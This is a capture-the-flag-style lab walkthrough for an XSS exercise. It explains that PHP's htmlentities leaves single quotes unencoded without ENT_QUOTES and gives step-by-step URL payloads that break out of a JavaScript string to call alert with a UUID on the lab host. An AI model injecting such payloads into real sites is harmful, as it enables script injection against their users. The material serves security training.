XSS 07

This example is similar to the one before. This time, you won't be able to use special characters, since they will be HTML-encoded. 
As you will see, you don't really need any of these characters.

This issue is common in PHP web applications, 
because the well-known function used to HTML-encode characters (htmlentities) does not encode single quotes ('), 
unless you told it to do so, using the ENT_QUOTES flag. 

 To finish this exercise, you need to trigger a pop-up (alert or confirm) with your UUID (dd19b1aa-7a48-4881-87ce-4fd3f96516f8) 
 as argument <script>alert('dd19b1aa-7a48-4881-87ce-4fd3f96516f8')</script>. 

  You can access this exercise using the following URL: http://ptl-77f64c43-e1491a9d.libcurl.st/. 
  
  Steps:
        1) Visit the given URL: http://ptl-77f64c43-e1491a9d.libcurl.st/. 
        2) As before we can be redirected after 'click' to:  http://ptl-77f64c43-e1491a9d.libcurl.st/index.php?name=hacker
        3) Use (') and (") in parameter and observe in source code.
            ----> http://ptl-77f64c43-e1491a9d.libcurl.st/index.php?name=hacker'"
        4) In source code we can see:
            ----> var $a= ''&quot;';

        5) Again make a payload on this basis:
          ---->  http://ptl-5f29f094-4803806f.libcurl.st/index.php?name= hacker";var  a="
                        Also let's make alert('1'): 
                        http://ptl-77f64c43-e1491a9d.libcurl.st/index.php?name=hacker';alert('1');var a='
       
        6)  Then, let's pop-out our UUID replacing '1'.
            http://ptl-77f64c43-e1491a9d.libcurl.st/index.php?name=hacker';alert('dd19b1aa-7a48-4881-87ce-4fd3f96516f8');var a='
        7) Bravo!! you have already finished this exercise! 

        Happy Hacking!! :)
